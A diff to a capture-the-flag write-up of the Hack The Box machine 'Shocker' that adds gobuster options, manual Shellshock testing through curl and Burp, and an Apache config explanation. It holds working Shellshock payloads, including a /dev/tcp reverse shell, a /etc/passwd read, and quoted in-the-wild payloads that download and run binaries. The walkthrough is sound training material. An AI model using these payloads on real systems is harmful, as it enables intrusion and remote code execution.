@@ -107,7 +107,19 @@ Let's run a Nikto scan against the target.
 
 ### Gobuster
 
-Let's run gobuster against the target, and specify some file extensions to look for as well:
+Let's run gobuster against the target, and specify some file extensions to look for as well, using the following options:
+
+> \-q --> only output found items
+>
+> \-f --> add a trailing slash to each request (doubles the number of requests)
+>
+> \-t --> number of threads
+>
+> \-x --> send additional requests with the specified file extension appended to the word&#x20;
+
+{% hint style="info" %}
+NOTE: By default, gobuster does not append a trailing slash. Most web servers will do this for us and redirect the request to the queried route plus a trailing slash, however, in this case the web server does not do that. See the "Resources" section for more details on this.
+{% endhint %}
 
 ```
 └─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.56/ -q -f -t 100 -x php,sh,bak,txt
@@ -221,9 +233,96 @@ Nmap done: 1 IP address (1 host up) scanned in 7.26 seconds
 
 ## Gaining Access
 
-Based on our research (article above and links in Resources section), we managed to get a reverse shell using the following command:
+Let's test this manually to verify the code execution, as the nmap script got a 500 server error response from the target.
 
-> curl -A '() { :;}; /bin/bash -i >& /dev/tcp/10.10.14.3/8585 0>&1' http://10.10.10.56/cgi-bin/user.sh
+We'll use the following curl command to test:
+
+> \-A --> add the text in the coment fields as a header in the request
+
+```
+└─$ curl -A '() { :;}; id' http://10.10.10.56/cgi-bin/user.sh
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>500 Internal Server Error</title>
+</head><body>
+<h1>Internal Server Error</h1>
+<p>The server encountered an internal error or
+misconfiguration and was unable to complete
+your request.</p>
+<p>Please contact the server administrator at 
+ webmaster@localhost to inform them of the time this error occurred,
+ and the actions you performed just before this error.</p>
+<p>More information about this error may be available
+in the server error log.</p>
+<hr>
+<address>Apache/2.4.18 (Ubuntu) Server at 10.10.10.56 Port 80</address>
+</body></html>
+
+```
+
+We get the same 500 server error. To see what is happening here, we'll send the requests through BURP. Let's visit the page at [http://10.10.10.56/cgi-bin/user.sh](http://10.10.10.56/cgi-bin/user.sh) in a browser configured to use BURP as a proxy. We are prompted to open or save a file, so let's save it. Next, let's find the request in BURP and send it to repeater, and click Go.
+
+![](<../../.gitbook/assets/2 (3).JPG>)
+
+In the repsonse, we can see that the "Content-Type" header is "text/x-sh". A google search for this finds the following page, which confirms that the header type should be "application/sh" for a bash script, as shown below:
+
+{% embed url="https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types/Common_types" %}
+
+![](<../../.gitbook/assets/3 (5).JPG>)
+
+This explains why the browser asks us to open the file in an external program or save it to disk, because it doesn't recognize the header "text/sh". If we intercept the server response, and change the header to "text/plain" for example, the output would appear in the browser.
+
+Next, let's modify the "User-Agent" header with the shellshock command and send it, as shown below:
+
+![](<../../.gitbook/assets/4 (3).JPG>)
+
+We see that we are getting the 500 server error. A google search for "shellshock" returns a plethora of articles about this bug. Below is a forum post on a popular "Hacker" news feed site which shows some of the payloads that were being seen by Cloudflare back in Sept 2014:
+
+{% embed url="https://news.ycombinator.com/item?id=8366745" %}
+
+> () { :;}; /bin/ping -c 1 198.x.x.x
+>
+> () { :;}; echo shellshock-scan > /dev/udp/example.com/1234
+>
+> () { ignored;};/bin/bash -i >& /dev/tcp/104.x.x.x/80 0>&1
+>
+> () { test;};/usr/bin/wget http://example.com/music/file.mp3 -O \~/cgi-bin/file.mp3
+>
+> () { :; }; /usr/bin/curl -A xxxx http://112.x.x.x:8011
+>
+> () { :; }; /usr/bin/wget http://115.x.x.x/api/file.txt
+>
+> () { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd
+>
+> () { :; }; /bin/bash -c "if \[ $(/bin/uname -m | /bin/grep 64) ]; then /usr/bin/wget 82.x.x.x:1234/v64 -O /tmp/.osock; else /usr/bin/wget 82.x.x.x:1234/v -O /tmp/.osock; fi; /bin/chmod 777 /tmp/.osock; /tmp/.osock &
+
+We have already tried the first one, so lets try it again with the following payload from the above list, because we are trying to get RCE and view the output:
+
+> () { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd
+
+![](<../../.gitbook/assets/5 (4).JPG>)
+
+That worked, but why? Let's break it down:
+
+> () { :;}; --> this is the actual "bug"
+>
+> echo Content-type:text/plain; --> adds a new header to the response
+>
+> echo; --> add's a blank line after the new header, this is the key to fixing the 500 error
+>
+> /bin/cat /etc/passwd --> add's the output of this command after the blank line
+
+The reason we ketp seeing the 500 error was because when we sent the previous requests, there was no space between the headers and the content being returned, and so the server encounters the internal error. By adding the "echo", which just returns a blank line, it seperates the headers from the data, which is why we are able to view the responses when we add it in.
+
+In addition, we don't actually need the line "echo Content-type:text/plain;", as shown below:
+
+![](<../../.gitbook/assets/6 (5).JPG>)
+
+One last thing to note is the fact that we need to use the full path to the binary we are trying to execute. This is because, in the context of the web service, there is no environment and therefore no $PATH variable set. We could of course fix this in the payload but it's not really worth the effort as we already have the RCE.
+
+Next, let's get a reverse shell using the following command. Note that we don't need to add the "echo" here because we don't need to see any output from the server:
+
+> curl -A '() { :;}; echo;/bin/bash -i >& /dev/tcp/10.10.14.3/8585 0>&1' http://10.10.10.56/cgi-bin/user.sh
 
 ```
 └─$ nc -nvlp 8585
@@ -284,6 +383,89 @@ exit
 ```
 
 ## Resources
+
+### Trailing Slash and Automatic Redirection
+
+After rooting the box, I decided to find out why the route at /cgi-bin, which returns a code 404 not found, was not being redirected automatically to /cgi-bin/, which returned a 403 forbidden response.
+
+When I gained access to the box, I was dropped into the /var/lib/cgi-bin directory, which contains the user.sh script:
+
+```
+shelly@Shocker:/usr/lib/cgi-bin# ls -la
+ls -la
+total 12
+drwxr-xr-x  2 root root 4096 Sep 22  2017 .
+drwxr-xr-x 55 root root 4096 Sep 22  2017 ..
+-rwxr-xr-x  1 root root  113 Sep 22  2017 user.sh
+shelly@Shocker:/usr/lib/cgi-bin# 
+```
+
+Looking through the /etc/apache2 directory, I find the serve-cgi-bin.conf file which explains not only why the directory is not in the webroot, but why the trailing slash is not automatically added.
+
+```
+shelly@Shocker:/usr/lib/cgi-bin$ cd /etc/apache2
+cd /etc/apache2
+shelly@Shocker:/etc/apache2$ ls -la
+ls -la
+total 88
+drwxr-xr-x  8 root root  4096 Sep 22  2017 .
+drwxr-xr-x 90 root root  4096 Sep 22  2017 ..
+-rw-r--r--  1 root root  7115 Mar 19  2016 apache2.conf
+drwxr-xr-x  2 root root  4096 Sep 22  2017 conf-available
+drwxr-xr-x  2 root root  4096 Sep 22  2017 conf-enabled
+-rw-r--r--  1 root root  1778 Sep 22  2017 envvars
+-rw-r--r--  1 root root 31063 Mar 19  2016 magic
+drwxr-xr-x  2 root root 12288 Sep 22  2017 mods-available
+drwxr-xr-x  2 root root  4096 Sep 22  2017 mods-enabled
+-rw-r--r--  1 root root   320 Mar 19  2016 ports.conf
+drwxr-xr-x  2 root root  4096 Sep 22  2017 sites-available
+drwxr-xr-x  2 root root  4096 Sep 22  2017 sites-enabled
+shelly@Shocker:/etc/apache2$ ls -la sites-available
+ls -la sites-available
+total 20
+drwxr-xr-x 2 root root 4096 Sep 22  2017 .
+drwxr-xr-x 8 root root 4096 Sep 22  2017 ..
+-rw-r--r-- 1 root root 1332 Mar 19  2016 000-default.conf
+-rw-r--r-- 1 root root 6338 Apr  5  2016 default-ssl.conf
+shelly@Shocker:/etc/apache2$ ls -la conf-available
+ls -la conf-available
+total 28
+drwxr-xr-x 2 root root 4096 Sep 22  2017 .
+drwxr-xr-x 8 root root 4096 Sep 22  2017 ..
+-rw-r--r-- 1 root root  315 Mar 19  2016 charset.conf
+-rw-r--r-- 1 root root 3224 Mar 19  2016 localized-error-pages.conf
+-rw-r--r-- 1 root root  189 Mar 19  2016 other-vhosts-access-log.conf
+-rw-r--r-- 1 root root 2174 Mar 19  2016 security.conf
+-rw-r--r-- 1 root root  455 Mar 19  2016 serve-cgi-bin.conf
+shelly@Shocker:/etc/apache2$ cat conf-available/serve-cgi-bin.conf
+cat conf-available/serve-cgi-bin.conf
+<IfModule mod_alias.c>
+        <IfModule mod_cgi.c>
+                Define ENABLE_USR_LIB_CGI_BIN
+        </IfModule>
+
+        <IfModule mod_cgid.c>
+                Define ENABLE_USR_LIB_CGI_BIN
+        </IfModule>
+
+        <IfDefine ENABLE_USR_LIB_CGI_BIN>
+                ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
+                <Directory "/usr/lib/cgi-bin">
+                        AllowOverride None
+                        Options +ExecCGI -MultiViews +SymLinksIfOwnerMatch
+                        Require all granted
+                </Directory>
+        </IfDefine>
+</IfModule>
+
+# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
+shelly@Shocker:/etc/apache2$ 
+
+```
+
+As we can see, the "ScriptAlias" directive only matches "/cgi-bin/", and so, when we try "/cgi-bin", it doesn't match and instead of being routed to the /usr/lib/cgi-bin directory, we get the not found response returned.
+
+### Links
 
 {% embed url="https://resources.infosecinstitute.com/topic/practical-shellshock-exploitation-part-2" %}
 
